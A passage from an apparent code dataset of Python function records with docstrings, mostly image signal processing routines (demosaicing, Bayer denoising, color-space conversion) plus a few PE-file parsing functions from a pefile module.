r_over_g_zeta2[1::2, 1::2])\n    # B at G locations\n    data[::2, 1::2, 2] = -beta + np.multiply(data_beta[::2, 1::2, 1], b_over_g_zeta1[::2, 1::2])\n    data[1::2, ::2, 2] = -beta + np.multiply(data_beta[1::2, ::2, 1], b_over_g_zeta1[1::2, ::2])\n    # R at G locations\n    data[::2, 1::2, 0] = -beta + np.multiply(data_beta[::2, 1::2, 1], r_over_g_zeta1[::2, 1::2])\n    data[1::2, ::2, 0] = -beta + np.multiply(data_beta[1::2, ::2, 1], r_over_g_zeta1[1::2, ::2])\n\nelif self.bayer_pattern == \"grbg\":\n    # G at B locations\n    data[1::2, ::2, 1] = -beta + np.multiply(data_beta[1::2, ::2, 2], g_over_b[1::2, 1::2])\n    # G at R locations\n    data[::2, 1::2, 1] = -beta + np.multiply(data_beta[::2, 1::2, 0], g_over_r[::2, 1::2])\n    # B at R locations\n    data[::2, 1::2, 2] = -beta + np.multiply(data_beta[::2, 1::2, 1], b_over_g_zeta2[::2, 1::2])\n    # R at B locations\n    data[1::2, ::2, 0] = -beta + np.multiply(data_beta[1::2, ::2, 1], r_over_g_zeta2[1::2, ::2])\n    # B at G locations\n    data[::2, ::2, 2] = -beta + np.multiply(data_beta[::2, ::2, 1], b_over_g_zeta1[::2, ::2])\n    data[1::2, 1::2, 2] = -beta + np.multiply(data_beta[1::2, 1::2, 1], b_over_g_zeta1[1::2, 1::2])\n    # R at G locations\n    data[::2, ::2, 0] = -beta + np.multiply(data_beta[::2, ::2, 1], r_over_g_zeta1[::2, ::2])\n    data[1::2, 1::2, 0] = -beta + np.multiply(data_beta[1::2, 1::2, 1], r_over_g_zeta1[1::2, 1::2])\n\nelif self.bayer_pattern == \"gbrg\":\n    # G at B locations\n    data[::2, 1::2, 1] = -beta + np.multiply(data_beta[::2, 1::2, 2], g_over_b[::2, 1::2])\n    # G at R locations\n    data[1::2, ::2, 1] = -beta + np.multiply(data_beta[1::2, ::2, 0], g_over_r[1::2, ::2])\n    # B at R locations\n    data[1::2, ::2, 2] = -beta + np.multiply(data_beta[1::2, ::2, 1], b_over_g_zeta2[1::2, ::2])\n    # R at B locations\n    data[::2, 1::2, 0] = -beta + np.multiply(data_beta[::2, 1::2, 1], r_over_g_zeta2[::2, 1::2])\n    # B at G locations\n    data[::2, ::2, 2] = -beta + np.multiply(data_beta[::2, ::2, 1], b_over_g_zeta1[::2, ::2])\n    data[1::2, 1::2, 2] = -beta + np.multiply(data_beta[1::2, 1::2, 1], b_over_g_zeta1[1::2, 1::2])\n    # R at G locations\n    data[::2, ::2, 0] = -beta + np.multiply(data_beta[::2, ::2, 1], r_over_g_zeta1[::2, ::2])\n    data[1::2, 1::2, 0] = -beta + np.multiply(data_beta[1::2, 1::2, 1], r_over_g_zeta1[1::2, 1::2])\n\nelif self.bayer_pattern == \"bggr\":\n    # G at B locations\n    data[::2, ::2, 1] = -beta + np.multiply(data_beta[::2, ::2, 2], g_over_b[::2, ::2])\n    # G at R locations\n    data[1::2, 1::2, 1] = -beta + np.multiply(data_beta[1::2, 1::2, 0], g_over_r[1::2, 1::2])\n    # B at R locations\n    data[1::2, 1::2, 2] = -beta + np.multiply(data_beta[1::2, 1::2, 1], b_over_g_zeta2[1::2, 1::2])\n    # R at B locations\n    data[::2, ::2, 0] = -beta + np.multiply(data_beta[::2, ::2, 1], r_over_g_zeta2[::2, ::2])\n    # B at G locations\n    data[::2, 1::2, 2] = -beta + np.multiply(data_beta[::2, 1::2, 1], b_over_g_zeta1[::2, 1::2])\n    data[1::2, ::2, 2] = -beta + np.multiply(data_beta[1::2, ::2, 1], b_over_g_zeta1[1::2, ::2])\n    # R at G locations\n    data[::2, 1::2, 0] = -beta + np.multiply(data_beta[::2, 1::2, 1], r_over_g_zeta1[::2, 1::2])\n    data[1::2, ::2, 0] = -beta + np.multiply(data_beta[1::2, ::2, 1], r_over_g_zeta1[1::2, ::2])\n\n\nreturn np.clip(data, self.clip_range[0], self.clip_range[1])", "path": "imaging.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "# This function updates data and corresponding fields\n", "func_signal": "def set_data(self, data):\n", "code": "self.data = data\nself.size = np.shape(self.data)\nself.data_type = self.data.dtype\nself.min_value = np.min(self.data)\nself.max_value = np.max(self.data)", "path": "imaging.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "#------------------------------------------------------\n# function: bayer_channel_separation\n#   Objective: Outputs four channels of the bayer pattern\n#   Input:\n#       data:   the bayer data\n#       pattern:    rggb, grbg, gbrg, or bggr\n#   Output:\n#       R, G1, G2, B (Quarter resolution images)\n#------------------------------------------------------\n", "func_signal": "def bayer_channel_separation(self, pattern):\n", "code": "if (pattern == \"rggb\"):\n    R = self.data[::2, ::2]\n    G1 = self.data[::2, 1::2]\n    G2 = self.data[1::2, ::2]\n    B = self.data[1::2, 1::2]\nelif (pattern == \"grbg\"):\n    G1 = self.data[::2, ::2]\n    R = self.data[::2, 1::2]\n    B = self.data[1::2, ::2]\n    G2 = self.data[1::2, 1::2]\nelif (pattern == \"gbrg\"):\n    G1 = self.data[::2, ::2]\n    B = self.data[::2, 1::2]\n    R = self.data[1::2, ::2]\n    G2 = self.data[1::2, 1::2]\nelif (pattern == \"bggr\"):\n    B = self.data[::2, ::2]\n    G1 = self.data[::2, 1::2]\n    G2 = self.data[1::2, ::2]\n    R = self.data[1::2, 1::2]\nelse:\n    print(\"pattern must be one of these: rggb, grbg, gbrg, bggr\")\n    return\n\nreturn R, G1, G2, B", "path": "utility.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "# convert to float32 in case it was not\n", "func_signal": "def __init__(self, data, name=\"bayer_denoising\"):\n", "code": "self.data = np.float32(data)\nself.name = name", "path": "imaging.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "#------------------------------------------------------\n# returns width, height\n# We assume data be in height x width x number of channel x frames format\n#------------------------------------------------------\n", "func_signal": "def get_width_height(self):\n", "code": "if (np.ndim(self.data) > 1):\n    size = np.shape(self.data)\n    width = size[1]\n    height = size[0]\n    return width, height\nelse:\n    print(\"Error! data dimension must be 2 or greater\")", "path": "utility.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "# Creates normally distributed noisy image\n", "func_signal": "def create_random_noise_image(self, mean=0, standard_deviation=1, seed=0):\n", "code": "np.random.seed(seed)\nreturn np.random.normal(mean, standard_deviation, (self.height, self.width))", "path": "utility.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "# Objective: bayer denoising\n# Inputs:\n#   bayer_pattern:  rggb, gbrg, grbg, bggr\n#   initial_noise_level:\n# Output:\n#   denoised bayer raw output\n# Source: Based on paper titled \"Noise Reduction for CFA Image Sensors\n#   Exploiting HVS Behaviour,\" by Angelo Bosco, Sebastiano Battiato,\n#   Arcangelo Bruna and Rosetta Rizzo\n#   Sensors 2009, 9, 1692-1713; doi:10.3390/s90301692\n\n", "func_signal": "def utilize_hvs_behavior(self, bayer_pattern, initial_noise_level, hvs_min, hvs_max, threshold_red_blue, clip_range):\n", "code": "print(\"----------------------------------------------------\")\nprint(\"Running bayer denoising utilizing hvs behavior...\")\n\n# copy the self.data to raw and we will only work on raw\n# to make sure no change happen to self.data\nraw = self.data\nraw = np.clip(raw, clip_range[0], clip_range[1])\nwidth, height = utility.helpers(raw).get_width_height()\n\n# First make the bayer_pattern rggb\n# The algorithm is written only for rggb pattern, thus convert all other\n# pattern to rggb. Furthermore, this shuffling does not affect the\n# algorithm output\nif (bayer_pattern != \"rggb\"):\n    raw = utility.helpers(self.data).shuffle_bayer_pattern(bayer_pattern, \"rggb\")\n\n# fixed neighborhood_size\nneighborhood_size = 5 # we are keeping this fixed\n                      # bigger size such as 9 can be declared\n                      # however, the code need to be changed then\n\n# pad two pixels at the border\nno_of_pixel_pad = math.floor(neighborhood_size / 2)   # number of pixels to pad\n\nraw = np.pad(raw, \\\n             (no_of_pixel_pad, no_of_pixel_pad),\\\n             'reflect') # reflect would not repeat the border value\n\n# allocating space for denoised output\ndenoised_out = np.empty((height, width), dtype=np.float32)\n\ntexture_degree_debug = np.empty((height, width), dtype=np.float32)\nfor i in range(no_of_pixel_pad, height + no_of_pixel_pad):\n    for j in range(no_of_pixel_pad, width + no_of_pixel_pad):\n\n        # center pixel\n        center_pixel = raw[i, j]\n\n        # signal analyzer block\n        half_max = clip_range[1] / 2\n        if (center_pixel <= half_max):\n            hvs_weight = -(((hvs_max - hvs_min) * center_pixel) / half_max) + hvs_max\n        else:\n            hvs_weight = (((center_pixel - clip_range[1]) * (hvs_max - hvs_min))/(clip_range[1] - half_max)) + hvs_max\n\n        # noise level estimator previous value\n        if (j < no_of_pixel_pad+2):\n            noise_level_previous_red   = initial_noise_level\n            noise_level_previous_blue  = initial_noise_level\n            noise_level_previous_green = initial_noise_level\n        else:\n            noise_level_previous_green = noise_level_current_green\n            if ((i % 2) == 0): # red\n                noise_level_previous_red = noise_level_current_red\n            elif ((i % 2) != 0): # blue\n                noise_level_previous_blue = noise_level_current_blue\n\n        # Processings depending on Green or Red/Blue\n        # Red\n        if (((i % 2) == 0) and ((j % 2) == 0)):\n            # get neighborhood\n            neighborhood = [raw[i-2, j-2], raw[i-2, j], raw[i-2, j+2],\\\n                            raw[i, j-2], raw[i, j+2],\\\n                            raw[i+2, j-2], raw[i+2, j], raw[i+2, j+2]]\n\n            # absolute difference from the center pixel\n            d =  np.abs(neighborhood - center_pixel)\n\n            # maximum and minimum difference\n            d_max = np.max(d)\n            d_min = np.min(d)\n\n            # calculate texture_threshold\n            texture_threshold = hvs_weight + noise_level_previous_red\n\n            # texture degree analyzer\n            if (d_max <= threshold_red_blue):\n                texture_degree = 1.\n            elif ((d_max > threshold_red_blue) and (d_max <= texture_threshold)):\n                texture_degree = -((d_max - threshold_red_blue) / (texture_threshold - threshold_red_blue)) + 1.\n            elif (d_max > texture_threshold):\n                texture_degree = 0.\n\n            # noise level estimator update\n            noise_level_current_red = texture_degree * d_max + (1 - texture_degree) * noise_level_previous_red\n\n        # Blue\n        elif (((i % 2) != 0) and ((j % 2) != 0)):\n\n            # get neighborhood\n            neighborhood = [raw[i-2, j-2], raw[i-2, j], raw[i-2, j+2],\\\n                            raw[i, j-2], raw[i, j+2],\\\n                            raw[i+2, j-2], raw[i+2, j], raw[i+2, j+2]]\n\n            # absolute difference from the center pixel\n            d =  np.abs(neighborhood - center_pixel)\n\n            # maximum and minimum difference\n            d_max = np.max(d)\n            d_min = np.min(d)\n\n            # calculate texture_threshold\n            texture_threshold = hvs_weight + noise_level_previous_blue\n\n            # texture degree analyzer\n            if (d_max <= threshold_red_blue):\n                texture_degree = 1.\n            elif ((d_max > threshold_red_blue) and (d_max <= texture_threshold)):\n                texture_degree = -((d_max - threshold_red_blue) / (texture_threshold - threshold_red_blue)) + 1.\n            elif (d_max > texture_threshold):\n                texture_degree = 0.\n\n            # noise level estimator update\n            noise_level_current_blue = texture_degree * d_max + (1 - texture_degree) * noise_level_previous_blue\n\n        # Green\n        elif ((((i % 2) == 0) and ((j % 2) != 0)) or (((i % 2) != 0) and ((j % 2) == 0))):\n\n            neighborhood = [raw[i-2, j-2], raw[i-2, j], raw[i-2, j+2],\\\n                            raw[i-1, j-1], raw[i-1, j+1],\\\n                            raw[i, j-2], raw[i, j+2],\\\n                            raw[i+1, j-1], raw[i+1, j+1],\\\n                            raw[i+2, j-2], raw[i+2, j], raw[i+2, j+2]]\n\n            # difference from the center pixel\n            d = np.abs(neighborhood - center_pixel)\n\n            # maximum and minimum difference\n            d_max = np.max(d)\n            d_min = np.min(d)\n\n            # calculate texture_threshold\n            texture_threshold = hvs_weight + noise_level_previous_green\n\n            # texture degree analyzer\n            if (d_max == 0):\n                texture_degree = 1\n            elif ((d_max > 0) and (d_max <= texture_threshold)):\n                texture_degree = -(d_max / texture_threshold) + 1.\n            elif (d_max > texture_threshold):\n                texture_degree = 0\n\n            # noise level estimator update\n            noise_level_current_green = texture_degree * d_max + (1 - texture_degree) * noise_level_previous_green\n\n        # similarity threshold calculation\n        if (texture_degree == 1):\n            threshold_low = threshold_high = d_max\n        elif (texture_degree == 0):\n            threshold_low = d_min\n            threshold_high = (d_max + d_min) / 2\n        elif ((texture_degree > 0) and (texture_degree < 1)):\n            threshold_high = (d_max + ((d_max + d_min) / 2)) / 2\n            threshold_low = (d_min + threshold_high) / 2\n\n        # weight computation\n        weight = np.empty(np.size(d), dtype=np.float32)\n        pf = 0.\n        for w_i in range(0, np.size(d)):\n            if (d[w_i] <= threshold_low):\n                weight[w_i] = 1.\n            elif (d[w_i] > threshold_high):\n                weight[w_i] = 0.\n            elif ((d[w_i] > threshold_low) and (d[w_i] < threshold_high)):\n                weight[w_i] = 1. + ((d[w_i] - threshold_low) / (threshold_low - threshold_high))\n\n            pf += weight[w_i] * neighborhood[w_i] + (1. - weight[w_i]) * center_pixel\n\n        denoised_out[i - no_of_pixel_pad, j-no_of_pixel_pad] = pf / np.size(d)\n        # texture_degree_debug is a debug output\n        texture_degree_debug[i - no_of_pixel_pad, j-no_of_pixel_pad] = texture_degree\n\nif (bayer_pattern != \"rggb\"):\n    denoised_out = utility.shuffle_bayer_pattern(denoised_out, \"rggb\", bayer_pattern)\n\nreturn np.clip(denoised_out, clip_range[0], clip_range[1]), texture_degree_debug", "path": "imaging.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "# Returns the Sobel filter kernels Sx and Sy\n\n", "func_signal": "def sobel(self, kernel_size):\n", "code": "Sx = .25 * np.dot([[1.], [2.], [1.]], [[1., 0., -1.]])\n\nif (kernel_size > 3):\n\n    n = np.int(np.floor((kernel_size - 5) / 2 + 1))\n\n    for i in range(0, n):\n\n        Sx = (1./16.) * signal.convolve2d(np.dot([[1.], [2.], [1.]], [[1., 2., 1.]]), Sx)\n\nSy = np.transpose(Sx)\n\nreturn Sx, Sy", "path": "utility.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "# dark_current_image:\n#       is captured from the camera with cap on\n#       and fully dark condition, several images captured and\n#       temporally averaged\n# flat_field_image:\n#       is found by capturing an image of a flat field test chart\n#       with certain lighting condition\n# Note: flat_field_compensation is memory intensive procedure because\n#       both the dark_current_image and flat_field_image need to be\n#       saved in memory beforehand\n", "func_signal": "def flat_field_compensation(self, dark_current_image, flat_field_image):\n", "code": "print(\"----------------------------------------------------\")\nprint(\"Running lens shading correction with flat field compensation...\")\n\n# convert to float32 in case it was not\ndark_current_image = np.float32(dark_current_image)\nflat_field_image = np.float32(flat_field_image)\ntemp = flat_field_image - dark_current_image\nreturn np.average(temp) * np.divide((self.data - dark_current_image), temp)", "path": "imaging.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "# Reference:\n# http://www.arl.army.mil/arlreports/2010/ARL-TR-5061.pdf\n\n", "func_signal": "def directionally_weighted_gradient_based_interpolation(self):\n", "code": "print(\"----------------------------------------------------\")\nprint(\"Running demosaicing using directionally weighted gradient based interpolation...\")\n\n# Fill up the green channel\nG = debayer.fill_channel_directional_weight(self.data, self.bayer_pattern)\n\nB, R = debayer.fill_br_locations(self.data, G, self.bayer_pattern)\n\nwidth, height = utility.helpers(self.data).get_width_height()\noutput = np.empty((height, width, 3), dtype=np.float32)\noutput[:, :, 0] = R\noutput[:, :, 1] = G\noutput[:, :, 2] = B\n\nreturn np.clip(output, self.clip_range[0], self.clip_range[1])", "path": "imaging.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "# --------------------------------------------------------------\n# nsr_threshold: near saturated region threshold (in percentage)\n# cr_threshold: candidate region threshold\n# --------------------------------------------------------------\n\n", "func_signal": "def purple_fringe_removal(self, nsr_threshold, cr_threshold, clip_range=[0, 65535]):\n", "code": "width, height = utility.helpers(self.data).get_width_height()\n\nr = self.data[:, :, 0]\ng = self.data[:, :, 1]\nb = self.data[:, :, 2]\n\n## Detection of purple fringe\n# near saturated region detection\nnsr_threshold = clip_range[1] * nsr_threshold / 100\ntemp = (r + g + b) / 3\ntemp = np.asarray(temp)\nmask = temp > nsr_threshold\nnsr = np.zeros((height, width), dtype=np.int)\nnsr[mask] = 1\n\n# candidate region detection\ntemp = r - b\ntemp1 = b - g\ntemp = np.asarray(temp)\ntemp1 = np.asarray(temp1)\nmask = (temp < cr_threshold) & (temp1 > cr_threshold)\ncr = np.zeros((height, width), dtype=np.int)\ncr[mask] = 1\n\n# quantization\nqr = utility.helpers(r).nonuniform_quantization()\nqg = utility.helpers(g).nonuniform_quantization()\nqb = utility.helpers(b).nonuniform_quantization()\n\ng_qr = utility.edge_detection(qr).sobel(5, \"gradient_magnitude\")\ng_qg = utility.edge_detection(qg).sobel(5, \"gradient_magnitude\")\ng_qb = utility.edge_detection(qb).sobel(5, \"gradient_magnitude\")\n\ng_qr = np.asarray(g_qr)\ng_qg = np.asarray(g_qg)\ng_qb = np.asarray(g_qb)\n\n# bgm: binary gradient magnitude\nbgm = np.zeros((height, width), dtype=np.float32)\nmask = (g_qr != 0) | (g_qg != 0) | (g_qb != 0)\nbgm[mask] = 1\n\nfringe_map = np.multiply(np.multiply(nsr, cr), bgm)\nfring_map = np.asarray(fringe_map)\nmask = (fringe_map == 1)\n\nr1 = r\ng1 = g\nb1 = b\nr1[mask] = g1[mask] = b1[mask] = (r[mask] + g[mask] + b[mask]) / 3.\n\noutput = np.empty(np.shape(self.data), dtype=np.float32)\noutput[:, :, 0] = r1\noutput[:, :, 1] = g1\noutput[:, :, 2] = b1\n\nreturn np.float32(output)", "path": "imaging.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "#------------------------------------------------------\n# function: bayer_channel_integration\n#   Objective: combine data into a raw according to pattern\n#   Input:\n#       R, G1, G2, B:   the four separate channels (Quarter resolution)\n#       pattern:    rggb, grbg, gbrg, or bggr\n#   Output:\n#       data (Full resolution image)\n#------------------------------------------------------\n", "func_signal": "def bayer_channel_integration(self, R, G1, G2, B, pattern):\n", "code": "size = np.shape(R)\ndata = np.empty((size[0]*2, size[1]*2), dtype=np.float32)\nif (pattern == \"rggb\"):\n    data[::2, ::2] = R\n    data[::2, 1::2] = G1\n    data[1::2, ::2] = G2\n    data[1::2, 1::2] = B\nelif (pattern == \"grbg\"):\n    data[::2, ::2] = G1\n    data[::2, 1::2] = R\n    data[1::2, ::2] = B\n    data[1::2, 1::2] = G2\nelif (pattern == \"gbrg\"):\n    data[::2, ::2] = G1\n    data[::2, 1::2] = B\n    data[1::2, ::2] = R\n    data[1::2, 1::2] = G2\nelif (pattern == \"bggr\"):\n    data[::2, ::2] = B\n    data[::2, 1::2] = G1\n    data[1::2, ::2] = G2\n    data[1::2, 1::2] = R\nelse:\n    print(\"pattern must be one of these: rggb, grbg, gbrg, bggr\")\n    return\n\nreturn data", "path": "utility.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "# input rgb in range clip_range\n# output xyz is in range 0 to 1\n\n", "func_signal": "def rgb2xyz(self, color_space=\"srgb\", clip_range=[0, 65535]):\n", "code": "if (color_space == \"srgb\"):\n\n    # degamma / linearization\n    data = helpers(self.data).degamma_srgb(clip_range)\n    data = np.float32(data)\n    data = np.divide(data, clip_range[1])\n\n    # matrix multiplication`\n    output = np.empty(np.shape(self.data), dtype=np.float32)\n    output[:, :, 0] = data[:, :, 0] * 0.4124 + data[:, :, 1] * 0.3576 + data[:, :, 2] * 0.1805\n    output[:, :, 1] = data[:, :, 0] * 0.2126 + data[:, :, 1] * 0.7152 + data[:, :, 2] * 0.0722\n    output[:, :, 2] = data[:, :, 0] * 0.0193 + data[:, :, 1] * 0.1192 + data[:, :, 2] * 0.9505\n\nelif (color_space == \"adobe-rgb-1998\"):\n\n    # degamma / linearization\n    data = helpers(self.data).degamma_adobe_rgb_1998(clip_range)\n    data = np.float32(data)\n    data = np.divide(data, clip_range[1])\n\n    # matrix multiplication\n    output = np.empty(np.shape(self.data), dtype=np.float32)\n    output[:, :, 0] = data[:, :, 0] * 0.5767309 + data[:, :, 1] * 0.1855540 + data[:, :, 2] * 0.1881852\n    output[:, :, 1] = data[:, :, 0] * 0.2973769 + data[:, :, 1] * 0.6273491 + data[:, :, 2] * 0.0752741\n    output[:, :, 2] = data[:, :, 0] * 0.0270343 + data[:, :, 1] * 0.0706872 + data[:, :, 2] * 0.9911085\n\nelif (color_space == \"linear\"):\n\n    # matrix multiplication`\n    output = np.empty(np.shape(self.data), dtype=np.float32)\n    data = np.float32(self.data)\n    data = np.divide(data, clip_range[1])\n    output[:, :, 0] = data[:, :, 0] * 0.4124 + data[:, :, 1] * 0.3576 + data[:, :, 2] * 0.1805\n    output[:, :, 1] = data[:, :, 0] * 0.2126 + data[:, :, 1] * 0.7152 + data[:, :, 2] * 0.0722\n    output[:, :, 2] = data[:, :, 0] * 0.0193 + data[:, :, 1] * 0.1192 + data[:, :, 2] * 0.9505\n\nelse:\n    print(\"Warning! color_space must be srgb or adobe-rgb-1998.\")\n    return\n\nreturn output", "path": "utility.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "# Objective is to reduce the zipper effect around the edges\n# Inputs:\n#   edge_detect_kernel_size: the neighborhood size used to detect edges\n#   edge_threshold: the threshold value above which (compared against)\n#                   the gradient_magnitude to declare if it is an edge\n#   median_filter_kernel_size: the neighborhood size used to perform\n#                               median filter operation\n#   clip_range: used for scaling in edge_detection\n#\n# Output:\n#   output: median filtered output around the edges\n#   edge_location: a debug image to see where the edges were detected\n#                   based on the threshold\n\n\n# detect edge locations\n", "func_signal": "def post_process_median_filter(self, edge_detect_kernel_size=3, edge_threshold=0, median_filter_kernel_size=3, clip_range=[0, 65535]):\n", "code": "edge_location = utility.edge_detection(self.data).sobel(edge_detect_kernel_size, \"is_edge\", edge_threshold, clip_range)\n\n# allocate space for output\noutput = np.empty(np.shape(self.data), dtype=np.float32)\n\nif (np.ndim(self.data) > 2):\n\n    for i in range(0, np.shape(self.data)[2]):\n        output[:, :, i] = utility.helpers(self.data[:, :, i]).edge_wise_median(median_filter_kernel_size, edge_location[:, :, i])\n\nelif (np.ndim(self.data) == 2):\n    output = utility.helpers(self.data).edge_wise_median(median_filter_kernel_size, edge_location)\n\nreturn output, edge_location", "path": "imaging.py", "repo_name": "mushfiqulalam/isp", "stars": 272, "license": "mit", "language": "python", "size": 168488}
{"docstring": "\"\"\"Apply the relocation information to the image using the provided new image base.\n\nThis method will apply the relocation information to the image. Given the new base,\nall the relocations will be processed and both the raw data and the section's data\nwill be fixed accordingly.\nThe resulting image can be retrieved as well through the method:\n    \n    get_memory_mapped_image()\n\nIn order to get something that would more closely match what could be found in memory\nonce the Windows loader finished its work.\n\"\"\"\n\n", "func_signal": "def relocate_image(self, new_ImageBase):\n", "code": "relocation_difference = new_ImageBase - self.OPTIONAL_HEADER.ImageBase\n\n\nfor reloc in self.DIRECTORY_ENTRY_BASERELOC:\n    \n    virtual_address = reloc.struct.VirtualAddress\n    size_of_block = reloc.struct.SizeOfBlock\n    \n    # We iterate with an index because if the relocation is of type\n    # IMAGE_REL_BASED_HIGHADJ we need to also process the next entry\n    # at once and skip it for the next iteration\n    #\n    entry_idx = 0\n    while entry_idx<len(reloc.entries):\n        \n        entry = reloc.entries[entry_idx]\n        entry_idx += 1\n        \n        if entry.type == RELOCATION_TYPE['IMAGE_REL_BASED_ABSOLUTE']:\n            # Nothing to do for this type of relocation\n            pass\n        \n        elif entry.type == RELOCATION_TYPE['IMAGE_REL_BASED_HIGH']:\n            # Fix the high 16bits of a relocation\n            #\n            # Add high 16bits of relocation_difference to the\n            # 16bit value at RVA=entry.rva\n            \n            self.set_word_at_rva(\n                entry.rva,\n                ( self.get_word_at_rva(entry.rva) + relocation_difference>>16)&0xffff )\n        \n        elif entry.type == RELOCATION_TYPE['IMAGE_REL_BASED_LOW']:\n            # Fix the low 16bits of a relocation\n            #\n            # Add low 16 bits of relocation_difference to the 16bit value\n            # at RVA=entry.rva\n            \n            self.set_word_at_rva(\n                entry.rva,\n                ( self.get_word_at_rva(entry.rva) + relocation_difference)&0xffff)\n        \n        elif entry.type == RELOCATION_TYPE['IMAGE_REL_BASED_HIGHLOW']:\n            # Handle all high and low parts of a 32bit relocation\n            #\n            # Add relocation_difference to the value at RVA=entry.rva\n            \n            self.set_dword_at_rva(\n                entry.rva,\n                self.get_dword_at_rva(entry.rva)+relocation_difference)\n        \n        elif entry.type == RELOCATION_TYPE['IMAGE_REL_BASED_HIGHADJ']:\n            # Fix the high 16bits of a relocation and adjust\n            #\n            # Add high 16bits of relocation_difference to the 32bit value\n            # composed from the (16bit value at RVA=entry.rva)<<16 plus\n            # the 16bit value at the next relocation entry.\n            #\n            \n            # If the next entry is beyond the array's limits,\n            # abort... the table is corrupt\n            #\n            if entry_idx == len(reloc.entries):\n                break\n            \n            next_entry = reloc.entries[entry_idx]\n            entry_idx += 1\n            self.set_word_at_rva( entry.rva,\n                ((self.get_word_at_rva(entry.rva)<<16) + next_entry.rva +\n                relocation_difference & 0xffff0000) >> 16 )\n        \n        elif entry.type == RELOCATION_TYPE['IMAGE_REL_BASED_DIR64']:\n            # Apply the difference to the 64bit value at the offset\n            # RVA=entry.rva\n            \n            self.set_qword_at_rva(\n                entry.rva,\n                self.get_qword_at_rva(entry.rva) + relocation_difference)", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Get the SHA-1 hex-digest of the section's data.\"\"\"\n\n", "func_signal": "def get_hash_sha1(self):\n", "code": "if sha1 is not None:\n    return sha1( self.get_data() ).hexdigest()", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Adds a list of lines.\n\nThe list can be indented with the optional argument 'indent'.\n\"\"\"\n", "func_signal": "def add_lines(self, txt, indent=0):\n", "code": "for line in txt:\n    self.add_line(line, indent)", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Get the offset of data appended to the file and not contained within the area described in the headers.\"\"\"\n\n", "func_signal": "def get_overlay_data_start_offset(self):\n", "code": "highest_PointerToRawData = 0\nhighest_SizeOfRawData = 0\nfor section in self.sections:\n    \n    # If a section seems to fall outside the boundaries of the file we assume it's either\n    # because of intentionally misleading values or because the file is truncated\n    # In either case we skip it\n    if section.PointerToRawData + section.SizeOfRawData > len(self.__data__):\n        continue\n        \n    if section.PointerToRawData + section.SizeOfRawData > highest_PointerToRawData + highest_SizeOfRawData:\n        highest_PointerToRawData = section.PointerToRawData\n        highest_SizeOfRawData = section.SizeOfRawData\n        \nif len(self.__data__) > highest_PointerToRawData + highest_SizeOfRawData:\n    return highest_PointerToRawData + highest_SizeOfRawData\n    \nreturn None", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Overwrite the bytes at the given file offset with the given string.\n\nReturn True if successful, False otherwise. It can fail if the\noffset is outside the file's boundaries.\n\"\"\"\n\n", "func_signal": "def set_bytes_at_offset(self, offset, data):\n", "code": "if not isinstance(data, str):\n    raise TypeError('data should be of type: str')\n\nif offset >= 0 and offset < len(self.__data__):\n    self.__data__ = ( self.__data__[:offset] + data + self.__data__[offset+len(data):] )\nelse:\n    return False\n\nreturn True", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
{"docstring": "\"\"\"Get data chunk from a section.\n\nAllows to query data from the section by passing the\naddresses where the PE file would be loaded by default.\nIt is then possible to retrieve code and data by its real\naddresses as it would be if loaded.\n\"\"\"\n\n", "func_signal": "def get_data(self, start=None, length=None):\n", "code": "PointerToRawData_adj = self.pe.adjust_FileAlignment( self.PointerToRawData,\n    self.pe.OPTIONAL_HEADER.FileAlignment )\nVirtualAddress_adj = self.pe.adjust_SectionAlignment( self.VirtualAddress, \n    self.pe.OPTIONAL_HEADER.SectionAlignment, self.pe.OPTIONAL_HEADER.FileAlignment )\n\nif start is None:\n    offset = PointerToRawData_adj\nelse:\n    offset = ( start - VirtualAddress_adj ) + PointerToRawData_adj\n\nif length is not None:\n    end = offset + length\nelse:\n    end = offset + self.SizeOfRawData\n    \n# PointerToRawData is not adjusted here as we might want to read any possible extra bytes\n# that might get cut off by aligning the start (and hence cutting something off the end)\n#\nif end > self.PointerToRawData + self.SizeOfRawData:\n    end = self.PointerToRawData + self.SizeOfRawData\n\nreturn self.pe.__data__[offset:end]", "path": "modules\\pefile.py", "repo_name": "Xen0ph0n/YaraGenerator", "stars": 314, "license": "None", "language": "python", "size": 551}
